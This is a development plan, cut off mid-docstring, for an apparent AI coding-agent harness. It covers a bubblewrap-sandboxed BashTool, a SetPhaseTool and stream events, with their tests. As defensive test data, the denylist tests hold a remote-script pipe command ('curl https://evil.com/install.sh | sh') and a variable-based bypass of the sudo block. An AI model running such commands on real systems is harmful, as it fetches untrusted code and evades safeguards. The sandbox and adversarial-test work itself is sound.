# chronos · Phase 4 — Bash + SetPhase + Stream Events

> **Project:** [chronos — Agent Variant B Single-Agent Implementation](index.md)
> **Phase:** 4 of 9 (Round 2) · **Tasks:** 9 · **Depends on:** [Phase 2](phase-2-basetool.md) · **Unblocks:** Phase 5, Phase 5a
> **Spec reference:** [Design spec §4.4–§4.11 (BashTool + sandbox + SetPhaseTool) + §5.3 (event vocabulary) + §7.1 (adversarial suite) + §2.9.2 (Round 2: ClarificationRequested event, Task 4.9)](../../specs/2026-04-09-agent-variant-b-single-agent-design.md)

**Execution:** REQUIRED SUB-SKILL: Use `superpowers:subagent-driven-development` (recommended) or `superpowers:executing-plans`. Steps use checkbox (`- [ ]`) syntax for tracking.

---

## Phase goal

Land the last two tools in the T2 surface, both of which yield mid-execution `StreamEvent`s (so they extend `BaseTool` directly, not `SimpleTool`) — and ship the event types those tools emit.

1. **Stream event additions**: `PhaseChanged(phase)`, plus `tool_use_id: str` field on `ToolExecutionStarted` / `ToolExecutionCompleted`. `FixLoopStarted` / `FixLoopCompleted` are **deleted** — spec §2.6 decided the frontend detects fix loops visually from bash-error → edit → bash sequences, so the event types are dead weight.
2. **`SetPhaseTool`**: smallest tool in the plan (~15 lines of logic) but architecturally important as the first tool to emit a `StreamEvent`. Yields `PhaseChanged(phase)` then a trivial `ToolResult`.
3. **`BashTool`**: the biggest risk surface. Runs user commands inside a **bubblewrap sandbox** with `--unshare-all` (no network, isolated namespaces), cwd locked to the workspace, environment whitelisted, output capped at 100 KB, timeout enforced via `killpg(SIGKILL)` on the process group. Yields `ThinkingStarted(label)` before the subprocess, `ThinkingStopped` after, then a `ToolResult`.
4. **Two-layer defense**: bubblewrap is the actual security boundary; the regex "intent denylist" is a fast UX hint that catches `sudo`, `apt install`, `curl … | sh` etc. before even starting the subprocess and tells the agent "this will fail because X" instead of letting bwrap produce a cryptic error. **The denylist is not a security boundary** — any adversarial test that "beats" the denylist must still be caught by bwrap.
5. **Adversarial bash suite**: 13 adversarial tests (spec §7.1) verifying the sandbox can't read `/etc/passwd`, can't see `$GITHUB_TOKEN`, can't make network calls, can't kill parent processes, can't bypass timeouts, etc. These are P0 gates — a single failure blocks the phase.

**Completion gate:**
- `pytest ai-worker/tests/openharness/tools/test_phase_tool.py -v` — passes (SetPhaseTool contract + behavior tests)
- `pytest ai-worker/tests/openharness/tools/test_bash_tool.py -v` — passes (happy path + error paths + timeout + output cap + denylist)
- `pytest ai-worker/tests/openharness/tools/test_bash_adversarial.py -v` — **all 13 tests pass** (P0, no exceptions)
- `pytest ai-worker/tests/openharness/tools/test_base_tool_contract.py -v` — 48 tests pass (4 contracts × 12 tool classes: 4 context + 6 file + BashTool + SetPhaseTool)
- `pytest ai-worker/tests/openharness/test_stream_events_base.py -v` still passes after the event changes, plus 3 new `test_clarification_requested_*` tests from Task 4.9
- `grep -c "FixLoop" ai-worker/src/openharness/engine/stream_events.py` returns 0
- `grep -c "tool_use_id" ai-worker/src/openharness/engine/stream_events.py` returns ≥ 3 (added to ToolExecutionStarted, ToolExecutionCompleted, and ClarificationRequested)
- `grep -c "ClarificationRequested" ai-worker/src/openharness/engine/stream_events.py` returns ≥ 1 (the new Round 2 dataclass)
- `grep -c "clarification_requested" ai-worker/src/api_server.py` returns ≥ 1 (the new `_serialize_event` branch)

## Why this phase matters

`BashTool` is the highest-risk code in the project. Every other tool has a narrow failure mode (wrong path, missing file, binary reject); bash has an open-ended failure mode — the user (via the LLM) can run any shell command. The only things standing between the agent and the host filesystem are bubblewrap's namespace isolation and our environment whitelist. If either fails, the blast radius is the entire ai-worker container.

The silicon-valley standard here translates to **three non-negotiables**:
- **Never run the raw subprocess.** Always wrap in `bwrap` with `--unshare-all`. If bwrap is missing, the tool errors — no "fallback to unsandboxed". One code path.
- **Never trust the regex denylist.** It's a UX hint. The adversarial suite explicitly verifies that bypass attempts (e.g., `SUDO=sudo && $SUDO ls`) still fail at the bwrap layer.
- **Always kill the whole process group on timeout.** A single `proc.kill()` leaks children. We use `os.setsid` at spawn and `os.killpg(pgid, SIGKILL)` at timeout. Tested explicitly.

`SetPhaseTool` is architecturally important out of proportion to its size: it's the first proof that `BaseTool`'s async-generator contract (from Phase 2) actually delivers on its promise. The tool emits a typed `PhaseChanged` event mid-execution, the agent loop (already adapted in Phase 2 Task 2.6) forwards it verbatim without any hardcoded `if tool_name == "set_phase"` branch, and the frontend (Phase 6) consumes the event to highlight the step ribbon. If the contract were broken, this is where it would show up first.

---

## Shared conventions for Phase 4 tools

**Constructor pattern** (matching Phase 3):
```python
class BashTool(BaseTool):
    def __init__(self, workspace_root: Path) -> None:
        self._workspace_root = workspace_root
```

**Error shape**: still `ToolResult(is_error=True, output="...")` on expected failures. Never raise. The contract test (Task 4.6) re-runs over the two new tools to enforce this.

**StreamEvent yielding pattern** (new — first time in the plan):
```python
async def execute(self, arguments, context):
    # yield StreamEvent(s) freely
    yield ThinkingStarted(label="Running go build")
    try:
        result = await do_the_work()
    finally:
        yield ThinkingStopped()
    yield ToolResult(output=result)
```
The `try/finally` guarantees `ThinkingStopped` even if `do_the_work()` raises. The raise then either propagates (bug — tool is supposed to catch) or the tool catches it and yields a `ToolResult(is_error=True, ...)` after `ThinkingStopped`.

**Bubblewrap assumption**: the Phase 0 Dockerfile change installs `bubblewrap` in the ai-worker container. Tests that exercise bwrap skip cleanly on hosts without it (via `shutil.which("bwrap")` detection), matching how Phase 3's grep tests handle ripgrep.

---

### Task 4.1: Add `PhaseChanged` event + `tool_use_id` field + delete `FixLoop*` events

**Files:**
- Modify: `ai-worker/src/openharness/engine/stream_events.py`
- Modify: `ai-worker/tests/openharness/test_stream_events_base.py`

**Context:** Three changes to `stream_events.py`:

1. **Add `PhaseChanged(phase: str)`** — new dataclass emitted by `SetPhaseTool` in Task 4.3.
2. **Add `tool_use_id: str` to `ToolExecutionStarted` and `ToolExecutionCompleted`** — so frontend SSE consumers can correlate Started/Completed pairs by id rather than by positional ordering (spec §5.3). The `query.py` changes from Phase 2 Task 2.6 already thread `tu.id` through — we just add the field now so the dataclass matches.
3. **Delete `FixLoopStarted` and `FixLoopCompleted`** — spec §2.6 Q5.5 decided fix-loop detection is a pure frontend visual heuristic (bash_error → edit → bash sequence), not a backend event. The old events leak pair_pipeline semantics into the A2 architecture; purge them.

The existing `test_stream_events_base.py` likely has tests for `FixLoopStarted`/`FixLoopCompleted` construction. Those delete. If any test in the rest of the codebase imports the deleted names, it's a signal that something else still depends on them — grep first.

- [ ] **Step 1: Grep for FixLoop usages across the repo**

```bash
grep -rn "FixLoopStarted\|FixLoopCompleted\|fix_loop_started\|fix_loop_completed" \
  ai-worker/src/ ai-worker/tests/ forge-portal/ \
  --include="*.py" --include="*.ts" --include="*.tsx"
```
Expected: matches in `stream_events.py` itself, possibly `api_server.py` (if the SSE serializer mentions them), possibly test files, and possibly frontend event handlers.

Record the list. Each match becomes a cleanup action:
- `stream_events.py` → delete the class + import
- `api_server.py` → delete any `_serialize_event` branch that matches `isinstance(event, FixLoopStarted)`
- Test files → delete the test function entirely (these tests exist only because the events existed)
- Frontend handlers → handled in Phase 6 (the frontend deletion is explicitly in phase-6-frontend.md)

- [ ] **Step 2: Write/update the failing tests first**

Open `ai-worker/tests/openharness/test_stream_events_base.py`. If it doesn't exist (it's in the tree based on Phase 0 reconnaissance), create it. If it does, update it to:

```python
"""Smoke tests for stream_events dataclasses.

Full tool-level behavior lives in the per-tool test files. This
file just verifies the dataclasses construct correctly, hold the
right fields, and don't accidentally stop being frozen.
"""

import pytest

from src.openharness.engine.stream_events import (
    AssistantTextDelta,
    AssistantTurnComplete,
    ErrorEvent,
    PhaseChanged,
    SessionComplete,
    StreamEvent,
    ThinkingStarted,
    ThinkingStopped,
    ToolExecutionCompleted,
    ToolExecutionStarted,
)


def test_all_events_subclass_stream_event():
    """Every public event dataclass must subclass StreamEvent so
    the agent loop's isinstance filter in _execute_tool_call works.
    """
    for cls in (
        AssistantTextDelta,
        AssistantTurnComplete,
        ErrorEvent,
        PhaseChanged,
        SessionComplete,
        ThinkingStarted,
        ThinkingStopped,
        ToolExecutionCompleted,
        ToolExecutionStarted,
    ):
        assert issubclass(cls, StreamEvent), f"{cls.__name__} does not subclass StreamEvent"


def test_phase_changed_construction():
    evt = PhaseChanged(phase="Analyze")
    assert evt.phase == "Analyze"


def test_phase_changed_is_frozen():
    evt = PhaseChanged(phase="Build")
    with pytest.raises(Exception):  # FrozenInstanceError or AttributeError
        evt.phase = "Test"  # type: ignore[misc]


def test_tool_execution_started_has_tool_use_id():
    evt = ToolExecutionStarted(
        tool_use_id="toolu_abc123",
        tool_name="read_file",
        tool_input={"path": "foo.go"},
    )
    assert evt.tool_use_id == "toolu_abc123"
    assert evt.tool_name == "read_file"
    assert evt.tool_input == {"path": "foo.go"}


def test_tool_execution_completed_has_tool_use_id():
    evt = ToolExecutionCompleted(
        tool_use_id="toolu_abc123",
        tool_name="read_file",
        output="hello",
        is_error=False,
    )
    assert evt.tool_use_id == "toolu_abc123"


def test_fix_loop_events_are_gone():
    """FixLoopStarted and FixLoopCompleted were deleted in Phase 4.
    Importing them should fail — this test documents the removal
    and breaks if anyone adds them back without thinking."""
    from src.openharness.engine import stream_events
    assert not hasattr(stream_events, "FixLoopStarted")
    assert not hasattr(stream_events, "FixLoopCompleted")


def test_thinking_started_has_label():
    evt = ThinkingStarted(label="Running go build")
    assert evt.label == "Running go build"


def test_thinking_stopped_constructs():
    evt = ThinkingStopped()
    assert isinstance(evt, StreamEvent)
```

- [ ] **Step 3: Run the tests — expect failures**

```bash
cd ai-worker && python -m pytest tests/openharness/test_stream_events_base.py -v
```
Expected: `PhaseChanged` import fails (doesn't exist yet), `tool_use_id` fields don't exist on `ToolExecutionStarted`/`ToolExecutionCompleted`, `FixLoop*` hasattr tests may or may not fail depending on current state.

- [ ] **Step 4: Update `stream_events.py`**

Open `ai-worker/src/openharness/engine/stream_events.py`. Make these changes:

**Delete:**
```python
@dataclass(frozen=True)
class FixLoopStarted(StreamEvent):
    cycle: int
    max_cycles: int
    errors: int = 0


@dataclass(frozen=True)
class FixLoopCompleted(StreamEvent):
    cycle: int
    success: bool
```

**Modify `ToolExecutionStarted` to add `tool_use_id`** (and reorder so `tool_use_id` comes first for consistency):

```python
@dataclass(frozen=True)
class ToolExecutionStarted(StreamEvent):
    """Emitted when a tool begins executing."""
    tool_use_id: str
    tool_name: str
    tool_input: dict
```

**Modify `ToolExecutionCompleted` the same way:**

```python
@dataclass(frozen=True)
class ToolExecutionCompleted(StreamEvent):
    """Emitted when a tool finishes executing."""
    tool_use_id: str
    tool_name: str
    output: str
    is_error: bool
```

**Add `PhaseChanged`** somewhere near the other small dataclasses:

```python
@dataclass(frozen=True)
class PhaseChanged(StreamEvent):
    """Emitted by SetPhaseTool to signal a phase transition in the
    7-step workflow shown by the frontend ribbon.

    Valid phases: "Analyze", "Plan", "Generate", "Build", "Test",
    "Review", "Deploy". The agent calls set_phase with the new
    phase name and this event is yielded verbatim to the frontend.

    The literal set is NOT enforced at this dataclass level — it's
    a Pydantic Literal type on SetPhaseInput (Task 4.3), which
    catches invalid phases at tool-input-validation time before
    the event is ever constructed.
    """
    phase: str
```

- [ ] **Step 5: Run the tests again — expect them to pass**

```bash
cd ai-worker && python -m pytest tests/openharness/test_stream_events_base.py -v
```
Expected: all 8 tests pass.

- [ ] **Step 6: Check for call sites that construct the modified events without `tool_use_id`**

```bash
grep -rn "ToolExecutionStarted\|ToolExecutionCompleted" ai-worker/src/ ai-worker/tests/
```

Every call site must now pass `tool_use_id`. The Phase 2 Task 2.6 changes to `query.py` already did this. Double-check:

```bash
grep -n "ToolExecutionStarted\|ToolExecutionCompleted" ai-worker/src/openharness/engine/query.py
```
Expected: both constructions carry `tool_use_id=tu.id`. If not, fix (should have been done in Phase 2 Task 2.6 — if it wasn't, that's a Phase 2 regression).

Also check `api_server.py` (the SSE serializer):

```bash
grep -n "tool_started\|tool_completed\|tool_use_id" ai-worker/src/api_server.py
```
If the `_serialize_event` function populates `tool_use_id` on the Redis stream payload, it already uses `event.tool_use_id`. If it doesn't reference the id, Phase 5's api_server rewrite will fix that (Task 5.5) — not this phase's job.

- [ ] **Step 7: Grep for any remaining FixLoop references that would break the build**

```bash
grep -rn "FixLoopStarted\|FixLoopCompleted" ai-worker/src/
```
Expected: zero matches. If `api_server.py` still references them, delete those branches.

- [ ] **Step 8: Run the broader agent loop tests to catch transitive breakage**

```bash
cd ai-worker && python -m pytest tests/test_query_engine.py tests/test_agent_loop.py -v 2>&1 | tail -30
```
Expected: pass. If a test constructs `ToolExecutionStarted`/`ToolExecutionCompleted` without `tool_use_id`, update it.

- [ ] **Step 9: Commit**

```bash
git add ai-worker/src/openharness/engine/stream_events.py ai-worker/tests/openharness/test_stream_events_base.py ai-worker/src/openharness/engine/query.py 2>/dev/null
# Also stage api_server.py if the FixLoop grep flagged branches there
git add ai-worker/src/api_server.py 2>/dev/null || true
git commit -m "feat(events): PhaseChanged + tool_use_id; delete FixLoop*

Three changes to stream_events.py:

1. Add PhaseChanged(phase: str) — emitted by SetPhaseTool (Task 4.3)
   when the agent signals a 7-step workflow phase transition.
   Literal phase set enforced at SetPhaseInput level, not the
   dataclass.

2. Add tool_use_id: str to ToolExecutionStarted and
   ToolExecutionCompleted. Frontend SSE consumers can now
   correlate Started/Completed pairs by id rather than
   positional ordering. query.py already threads tu.id through
   (from Phase 2 Task 2.6).

3. Delete FixLoopStarted and FixLoopCompleted. Spec §2.6 Q5.5
   decided fix loops are a pure frontend visual heuristic
   (bash_error -> edit -> bash) — the events were pair_pipeline
   carryover and have no A2-era callers.

Any api_server.py branches that still referenced FixLoop* are
cleaned up in the same commit.

test_stream_events_base.py gets a sentinel test_fix_loop_events_are_gone
that hasattr-checks the module so future diffs re-adding them fail
loud."
```

---

### Task 4.2: `SetPhaseTool` + tests

**Files:**
- Create: `ai-worker/src/openharness/tools/phase_tool.py`
- Create: `ai-worker/tests/openharness/tools/test_phase_tool.py`
- Modify: `ai-worker/src/openharness/tools/__init__.py` (re-export)

**Context:** Smallest tool in the phase. Subclasses `BaseTool` directly (not `SimpleTool`) because it yields a `PhaseChanged` `StreamEvent` before its `ToolResult`. Input is a single `phase` field constrained to the 7-value Literal set — Pydantic rejects any other value at input-validation time (before `execute` even runs).

**Why not SimpleTool:** if we used SimpleTool, SetPhaseTool couldn't yield StreamEvents. We'd have to smuggle `PhaseChanged` out some other way — either by sniffing `tool_name == "set_phase"` in the agent loop (violates silicon-valley rule) or by storing state on the tool instance between calls (racy + coupling). Direct `BaseTool` subclassing is the clean answer. This is explicitly what spec §4.11 calls out.

- [ ] **Step 1: Write the failing tests**

Create `ai-worker/tests/openharness/tools/test_phase_tool.py`:

```python
"""Tests for SetPhaseTool.

SetPhaseTool is the smallest tool in the T2 set but architecturally
important as the first tool to yield a StreamEvent (PhaseChanged)
before its ToolResult. These tests verify the contract end-to-end.
"""

import pytest
from pydantic import ValidationError

from src.openharness.engine.stream_events import PhaseChanged, StreamEvent
from src.openharness.tools.base import ToolExecutionContext, ToolResult


@pytest.fixture
def phase_tool():
    from src.openharness.tools.phase_tool import SetPhaseTool
    return SetPhaseTool()


@pytest.fixture
def tool_ctx(tmp_path):
    return ToolExecutionContext(cwd=tmp_path)


async def _collect(tool, arguments, ctx):
    items = []
    async for item in tool.execute(arguments, ctx):
        items.append(item)
    return items


@pytest.mark.asyncio
async def test_set_phase_emits_phase_changed_then_result(phase_tool, tool_ctx):
    from src.openharness.tools.phase_tool import SetPhaseInput

    items = await _collect(
        phase_tool,
        SetPhaseInput(phase="Analyze"),
        tool_ctx,
    )
    # Expected order: PhaseChanged, then ToolResult
    assert len(items) == 2
    assert isinstance(items[0], PhaseChanged)
    assert items[0].phase == "Analyze"
    assert isinstance(items[1], ToolResult)
    assert not items[1].is_error
    assert "Analyze" in items[1].output


@pytest.mark.asyncio
@pytest.mark.parametrize("phase", [
    "Analyze", "Plan", "Generate", "Build", "Test", "Review", "Deploy",
])
async def test_set_phase_accepts_all_seven_phases(phase_tool, tool_ctx, phase):
    from src.openharness.tools.phase_tool import SetPhaseInput

    items = await _collect(phase_tool, SetPhaseInput(phase=phase), tool_ctx)
    phase_evt = next(i for i in items if isinstance(i, PhaseChanged))
    assert phase_evt.phase == phase


def test_set_phase_rejects_invalid_phase_at_input_validation():
    """Pydantic should reject invalid phase values before execute runs."""
    from src.openharness.tools.phase_tool import SetPhaseInput

    with pytest.raises(ValidationError):
        SetPhaseInput(phase="Analyse")  # British spelling — wrong
    with pytest.raises(ValidationError):
        SetPhaseInput(phase="")
    with pytest.raises(ValidationError):
        SetPhaseInput(phase="Debugging")  # not in the Literal set


@pytest.mark.asyncio
async def test_set_phase_is_read_only(phase_tool):
    from src.openharness.tools.phase_tool import SetPhaseInput

    args = SetPhaseInput(phase="Review")
    assert phase_tool.is_read_only(args) is True


@pytest.mark.asyncio
async def test_set_phase_contract_single_tool_result(phase_tool, tool_ctx):
    """The BaseTool contract says 'exactly one ToolResult'. This test
    verifies SetPhaseTool doesn't accidentally yield two ToolResults
    (e.g., from a copy-paste mistake in execute)."""
    from src.openharness.tools.phase_tool import SetPhaseInput

    items = await _collect(phase_tool, SetPhaseInput(phase="Generate"), tool_ctx)
    tool_results = [i for i in items if isinstance(i, ToolResult)]
    assert len(tool_results) == 1
    # The ToolResult must be LAST
    assert isinstance(items[-1], ToolResult)
```

- [ ] **Step 2: Run tests — expect import failure**

```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_phase_tool.py -v
```
Expected: `ModuleNotFoundError: src.openharness.tools.phase_tool`.

- [ ] **Step 3: Implement `phase_tool.py`**

Create `ai-worker/src/openharness/tools/phase_tool.py`:

```python
"""SetPhaseTool — signal a 7-step workflow phase transition.

Architecturally the first tool in the T2 set to yield a StreamEvent
mid-execution. SetPhaseTool extends BaseTool directly (not
SimpleTool) so it can yield a typed PhaseChanged event before its
final ToolResult. Spec §4.11 explicitly calls out why SimpleTool
doesn't fit: SimpleTool only yields a ToolResult, and 'sniff the
tool name in query.py to decide whether to emit PhaseChanged' is
the hardcoded-special-case anti-pattern the Phase 2 refactor was
designed to eliminate.

The 7-phase Literal set is enforced at Pydantic input validation,
so an invalid phase value never reaches execute() — the agent gets
a ValidationError in the ToolResultBlock path instead, which it
can see and retry.
"""

from __future__ import annotations

from typing import Literal

from pydantic import BaseModel, Field

from ..engine.stream_events import PhaseChanged
from .base import BaseTool, ToolExecutionContext, ToolResult


# The 7 phases of the Variant B workflow ribbon. The frontend's
# step-ribbon.tsx component hard-codes the same 7 labels.
Phase = Literal[
    "Analyze", "Plan", "Generate", "Build", "Test", "Review", "Deploy"
]


class SetPhaseInput(BaseModel):
    phase: Phase = Field(
        ...,
        description=(
            "The phase to transition to. Must be exactly one of: "
            "Analyze, Plan, Generate, Build, Test, Review, Deploy. "
            "The UI step ribbon will highlight this phase. You can "
            "go backwards (e.g. Build -> Generate to fix a compile "
            "error)."
        ),
    )


class SetPhaseTool(BaseTool):
    name = "set_phase"
    description = (
        "Signal which phase you're currently in. The UI step ribbon "
        "will highlight that phase. Available phases: Analyze "
        "(understanding requirements and code), Plan (deciding "
        "changes), Generate (writing code), Build (compiling), Test "
        "(running tests), Review (verifying own work), Deploy "
        "(committing or preparing deployment). Call this when you "
        "start a new phase. You can go backwards (e.g., Build -> "
        "Generate to fix a compile error)."
    )
    input_model = SetPhaseInput

    def is_read_only(self, arguments: BaseModel) -> bool:
        # set_phase doesn't touch the filesystem or run subprocesses.
        # It's a pure UI signal.
        return True

    async def execute(self, arguments: SetPhaseInput, context: ToolExecutionContext):
        yield PhaseChanged(phase=arguments.phase)
        yield ToolResult(output=f"Phase set to {arguments.phase}")
```

- [ ] **Step 4: Re-export from the tools package**

Edit `ai-worker/src/openharness/tools/__init__.py`. Add to the existing imports:

```python
from .phase_tool import SetPhaseInput, SetPhaseTool
```

And append to `__all__`:

```python
__all__ = [
    # ... existing exports ...
    "SetPhaseInput",
    "SetPhaseTool",
]
```

- [ ] **Step 5: Run tests**

```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_phase_tool.py -v
```
Expected: **11 tests pass** (1 basic + 7 phase parametrization + 1 validation + 1 is_read_only + 1 contract).

- [ ] **Step 6: Commit**

```bash
git add ai-worker/src/openharness/tools/phase_tool.py ai-worker/src/openharness/tools/__init__.py ai-worker/tests/openharness/tools/test_phase_tool.py
git commit -m "feat(tools): SetPhaseTool emits PhaseChanged mid-execution

First tool in the T2 set to extend BaseTool directly (not
SimpleTool). execute() yields PhaseChanged(phase) then a trivial
ToolResult — the architectural proof-of-life for the async-
generator contract refactored in Phase 2 Task 2.1.

Input is a Pydantic Literal over the 7 phases (Analyze/Plan/
Generate/Build/Test/Review/Deploy), so invalid phase values are
rejected at input-validation time before execute runs — the
agent sees a clear ValidationError in the ToolResultBlock rather
than a confusing runtime crash.

Why not SimpleTool: SimpleTool's async-gen wrapper only yields
a ToolResult. To emit PhaseChanged we'd have to either sniff
tool_name=='set_phase' in query.py (hardcoded special case,
forbidden by silicon-valley rule) or stash state on the tool
instance between calls. Direct BaseTool subclassing is the
clean answer.

Tests: 11 cases — basic emit order, all 7 phases parametrized,
invalid phase validation, is_read_only, contract single-result."
```

---

### Task 4.3: `BashTool` — denylist + bwrap args + subprocess runner

**Files:**
- Create: `ai-worker/src/openharness/tools/bash_tool.py`
- Create: `ai-worker/tests/openharness/tools/test_bash_tool.py`
- Modify: `ai-worker/src/openharness/tools/__init__.py` (re-export)

**Context:** The big tool. This task implements the tool class plus the four internal helpers:

1. `_intent_denylist_check(command)` — regex denylist, returns reason string or None
2. `_summarize_command(command)` — "Running go build" style label for `ThinkingStarted`
3. `_build_bwrap_args(workspace, command)` — constructs the bwrap argv array
4. `_run_in_bwrap(command, workspace, timeout)` — `asyncio.create_subprocess_exec` + `setsid` + `wait_for` + `killpg` on timeout
5. `_format_bash_output(command, exit_code, output_bytes)` — "$ cmd\\nexit code: N\\n\\n<stdout>" with 100 KB cap

Then the `BashTool.execute` async generator ties them together with the `ThinkingStarted` / `ThinkingStopped` emission pattern.

**This task delivers the tool and happy-path + error-path tests.** The adversarial tests live in Task 4.5 so the file split is clean.

**Prerequisite**: bubblewrap is installed in the ai-worker container (Phase 0 Task 0.1). Tests that require bwrap use `_require_bwrap()` helper similar to ripgrep detection in Phase 3.

- [ ] **Step 1: Write the happy-path + error tests**

Create `ai-worker/tests/openharness/tools/test_bash_tool.py`:

```python
"""Happy-path and error-path tests for BashTool.

Adversarial sandbox tests (path escape, network denial, env leak,
process group kill, etc.) live in test_bash_adversarial.py. Keeping
them in a separate file means a CI failure under *_adversarial.py
is a loud P0 signal vs. 'normal bug in bash tool'.

Tests in this file exercise bwrap for real where they can; the
_require_bwrap helper skips on hosts without it.
"""

import shutil
from pathlib import Path

import pytest

from src.openharness.engine.stream_events import (
    StreamEvent,
    ThinkingStarted,
    ThinkingStopped,
)
from src.openharness.tools.base import ToolExecutionContext, ToolResult


def _require_bwrap():
    if shutil.which("bwrap") is None:
        pytest.skip("bubblewrap (bwrap) not installed; bash tests require it")


@pytest.fixture
def bash_tool(workspace):
    from src.openharness.tools.bash_tool import BashTool
    return BashTool(workspace)


@pytest.fixture
def bash_ctx(workspace):
    return ToolExecutionContext(cwd=workspace)


async def _collect(tool, arguments, ctx):
    items = []
    async for item in tool.execute(arguments, ctx):
        items.append(item)
    return items


def _extract_result(items):
    results = [i for i in items if isinstance(i, ToolResult)]
    assert len(results) == 1
    return results[0]


# ---------------------------------------------------------------------------
# Happy path — requires bwrap
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_echo(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="echo hello world"),
        bash_ctx,
    )
    # Expected event shape: ThinkingStarted, ThinkingStopped, ToolResult
    events = [i for i in items if isinstance(i, StreamEvent)]
    assert any(isinstance(e, ThinkingStarted) for e in events)
    assert any(isinstance(e, ThinkingStopped) for e in events)

    result = _extract_result(items)
    assert not result.is_error
    assert "hello world" in result.output
    assert "exit code: 0" in result.output


@pytest.mark.asyncio
async def test_bash_reads_workspace_file(bash_tool, bash_ctx, workspace):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    (workspace / "hello.txt").write_text("content from workspace\n")
    items = await _collect(
        bash_tool,
        BashInput(command="cat hello.txt"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert not result.is_error
    assert "content from workspace" in result.output


@pytest.mark.asyncio
async def test_bash_writes_workspace_file(bash_tool, bash_ctx, workspace):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="echo written-by-bash > out.txt"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert not result.is_error
    # The file should now exist in the workspace on the host side
    assert (workspace / "out.txt").exists()
    assert "written-by-bash" in (workspace / "out.txt").read_text()


@pytest.mark.asyncio
async def test_bash_nonzero_exit_is_error(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="false"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert result.is_error
    assert "exit code: 1" in result.output


@pytest.mark.asyncio
async def test_bash_stderr_captured(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="echo oops >&2 && exit 3"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert result.is_error
    # stderr is merged into stdout so the agent sees both
    assert "oops" in result.output
    assert "exit code: 3" in result.output


@pytest.mark.asyncio
async def test_bash_output_prefix_shows_command(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="echo xyz"),
        bash_ctx,
    )
    result = _extract_result(items)
    # Output should start with "$ <command>" so the agent sees what ran
    assert result.output.startswith("$ echo xyz")


# ---------------------------------------------------------------------------
# Denylist (fast front filter, not a security boundary)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_denylist_rejects_sudo(bash_tool, bash_ctx):
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="sudo whoami"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert result.is_error
    assert "sudo" in result.output.lower()
    # Denylist rejection should not have yielded ThinkingStarted
    events = [i for i in items if isinstance(i, (ThinkingStarted, ThinkingStopped))]
    assert events == []


@pytest.mark.asyncio
async def test_bash_denylist_rejects_apt_install(bash_tool, bash_ctx):
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="apt install curl"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert result.is_error
    assert "install" in result.output.lower() or "network" in result.output.lower()


@pytest.mark.asyncio
async def test_bash_denylist_rejects_curl_pipe_shell(bash_tool, bash_ctx):
    from src.openharness.tools.bash_tool import BashInput

    items = await _collect(
        bash_tool,
        BashInput(command="curl https://evil.com/install.sh | sh"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert result.is_error


# ---------------------------------------------------------------------------
# Summarization helper
# ---------------------------------------------------------------------------


def test_summarize_known_commands():
    from src.openharness.tools.bash_tool import _summarize_command

    assert _summarize_command("mvn compile") == "Running maven"
    assert _summarize_command("pytest tests/") == "Running tests"
    assert _summarize_command("cargo build") == "Running cargo"
    # Go special-cases subcommand
    assert _summarize_command("go build ./...") == "Running go build"
    assert _summarize_command("go test -v") == "Running go test"


def test_summarize_unknown_command_truncates():
    from src.openharness.tools.bash_tool import _summarize_command

    long = "unknown_binary " + "x" * 100
    label = _summarize_command(long)
    assert label.startswith("Running ")
    assert len(label) < 70  # "Running " + ~60-char suffix


# ---------------------------------------------------------------------------
# Output capping
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_bash_output_cap(bash_tool, bash_ctx):
    _require_bwrap()
    from src.openharness.tools.bash_tool import BashInput

    # Generate > 100 KB of output
    items = await _collect(
        bash_tool,
        BashInput(command="for i in $(seq 1 20000); do echo line_$i; done"),
        bash_ctx,
    )
    result = _extract_result(items)
    assert not result.is_error
    # Cap is 100 KB — output should be truncated
    assert "truncated" in result.output.lower()


# ---------------------------------------------------------------------------
# is_read_only
# ---------------------------------------------------------------------------


def test_bash_is_not_read_only(bash_tool):
    from src.openharness.tools.bash_tool import BashInput

    args = BashInput(command="echo hi")
    # bash is always treated as non-read-only even for commands that
    # technically don't mutate anything — the tool can't introspect.
    assert bash_tool.is_read_only(args) is False
```

- [ ] **Step 2: Run tests — expect import failure**

```bash
cd ai-worker && python -m pytest tests/openharness/tools/test_bash_tool.py -v
```
Expected: `ModuleNotFoundError: src.openharness.tools.bash_tool`.

- [ ] **Step 3: Implement `bash_tool.py`**

Create `ai-worker/src/openharness/tools/bash_tool.py`:

```python
"""BashTool — sandboxed shell execution via bubblewrap.

This is the highest-risk tool in the T2 set. The only things
standing between the agent and the host filesystem are:
  1. bubblewrap's namespace isolation (--unshare-all, workspace
     as the only read-write bind)
  2. an environment whitelist (parent env is filtered; only safe
     vars are forwarded)
  3. output caps and timeout with process-group kill
  4. a cheap regex denylist as a UX hint (NOT a security boundary)

Layers 1-3 are the actual security. Layer 4 just gives the agent
a clean error message for common mistakes (sudo, apt install,
curl | sh) instead of letting bwrap produce a cryptic failure
after spawning the subprocess.

The tool yields ThinkingStarted before the subprocess and
ThinkingStopped in a try/finally so the frontend pulses an
indicator even if the command crashes. Both are StreamEvents
passed verbatim through the agent loop to the frontend.

Spec: §4.4–§4.10 (tool definition + bwrap args + process mgmt +
